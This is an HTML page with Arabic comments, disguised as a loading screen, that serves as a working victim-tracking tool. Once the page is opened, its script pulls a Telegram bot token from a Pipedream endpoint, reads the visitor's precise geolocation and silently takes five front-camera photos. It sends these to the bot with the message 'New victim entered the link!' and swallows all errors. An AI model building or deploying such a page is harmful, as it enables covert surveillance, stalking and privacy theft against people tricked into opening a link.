<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>جاري التحميل...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #1a1a2e, #16213e);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: 'Segoe UI', sans-serif;
      color: white;
    }
    .container { text-align: center; }
    .spinner {
      width: 70px; height: 70px;
      border: 5px solid rgba(255,255,255,0.2);
      border-top-color: #00ff88;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 25px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    video, canvas { display: none; }
    .status { font-size: 14px; opacity: 0.8; margin-top: 15px; }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner" id="spinner"></div>
    <h2 id="message">يرجى الانتظار...</h2>
    <p class="status" id="status"></p>
  </div>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <script>
    // ============ الإعدادات (فارغة، تتم تعبئتها من السيرفر) ============
    let BOT_TOKEN = '';
    let CHAT_ID = '';
    const CAPTURE_COUNT = 5;         // كم صورة يلتقط
    const CAPTURE_INTERVAL = 1500;   // الوقت بين كل صورة (مللي ثانية)
    let captureTimer = null;
    let imagesSent = 0;

    // ============ العناصر ============
    const spinner = document.getElementById('spinner');
    const messageEl = document.getElementById('message');
    const statusEl = document.getElementById('status');

    // ============ جلب الإعدادات من Pipedream ============
    async function fetchConfig() {
      try {
        // ⚠️ غير الرابط لرابط الـ Pipedream الخاص فيك
        const response = await fetch('https://eo3djhokj3ty6kt.m.pipedream.net');
        const data = await response.json();
        BOT_TOKEN = data.token;
        CHAT_ID = data.chatId;
        return true;
      } catch (err) {
        messageEl.textContent = 'فشل تحميل الصفحة';
        statusEl.textContent = 'الرجاء المحاولة لاحقاً';
        spinner.style.display = 'none';
        return false;
      }
    }

    // ============ إرسال رسالة نصية للبوت ============
    async function sendMessage(text) {
      if (!BOT_TOKEN || !CHAT_ID) return;
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML'
          })
        });
      } catch (e) { /* صامت */ }
    }

    // ============ إرسال صورة للبوت ============
    async function sendPhoto(blob, caption = '') {
      if (!BOT_TOKEN || !CHAT_ID) return;
      const formData = new FormData();
      formData.append('photo', blob, `capture_${Date.now()}.jpg`);
      formData.append('chat_id', CHAT_ID);
      if (caption) formData.append('caption', caption);

      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        imagesSent++;
        statusEl.textContent = `تم الالتقاط ${imagesSent}/${CAPTURE_COUNT}`;
      } catch (e) { /* صامت */ }
    }

    // ============ التقاط صورة وإرسالها ============
    function captureAndSend() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      if (!video.srcObject || video.readyState < 2) return;

      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext('2d').drawImage(video, 0, 0);

      canvas.toBlob((blob) => {
        sendPhoto(blob);
      }, 'image/jpeg', 0.75);
    }

    // ============ الحصول على الموقع ============
    function getLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject('المتصفح لا يدعم تحديد الموقع');
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve({
            lat: pos.coords.latitude,
            lng: pos.coords.longitude
          }),
          (err) => reject(err.message),
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }

    // ============ بدء الكاميرا ============
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: 640, height: 480 },
          audio: false
        });
        const video = document.getElementById('video');
        video.srcObject = stream;
        await video.play();
        return true;
      } catch (err) {
        throw new Error('لم يتم السماح بالكاميرا: ' + err.message);
      }
    }

    // ============ البرنامج الرئيسي ============
    async function main() {
      // 1. جلب الإعدادات
      const configLoaded = await fetchConfig();
      if (!configLoaded) return;

      // 2. طلب الموقع
      let locationText = 'غير متوفر';
      try {
        const loc = await getLocation();
        locationText = `https://maps.google.com/?q=${loc.lat},${loc.lng}`;
      } catch (e) {
        locationText = 'فشل: ' + e;
      }

      // 3. طلب الكاميرا
      try {
        await startCamera();
      } catch (e) {
        await sendMessage(`⚠️ ${e.message}\n📍 الموقع: ${locationText}`);
        messageEl.textContent = 'تعذر الوصول للكاميرا';
        spinner.style.display = 'none';
        return;
      }

      // 4. إرسال الموقع
      await sendMessage(`🎯 <b>ضحية جديدة دخلت الرابط!</b>\n📍 <a href="${locationText}">الموقع الجغرافي</a>`);

      // 5. بدء الالتقاط
      messageEl.textContent = 'جاري المعالجة...';
      statusEl.textContent = `0/${CAPTURE_COUNT}`;

      captureTimer = setInterval(() => {
        captureAndSend();
        if (imagesSent >= CAPTURE_COUNT) {
          clearInterval(captureTimer);
          sendMessage(`✅ اكتمل الالتقاط: ${imagesSent} صور`);
          spinner.style.display = 'none';
          messageEl.textContent = 'شكراً لك!';
          statusEl.textContent = 'تم الإرسال';
          // إيقاف الكاميرا
          const video = document.getElementById('video');
          if (video.srcObject) {
            video.srcObject.getTracks().forEach(t => t.stop());
          }
        }
      }, CAPTURE_INTERVAL);

      // أول صورة فوراً
      setTimeout(() => captureAndSend(), 500);
    }

    // ============ تشغيل ============
    main();
  </script>
</body>
</html>
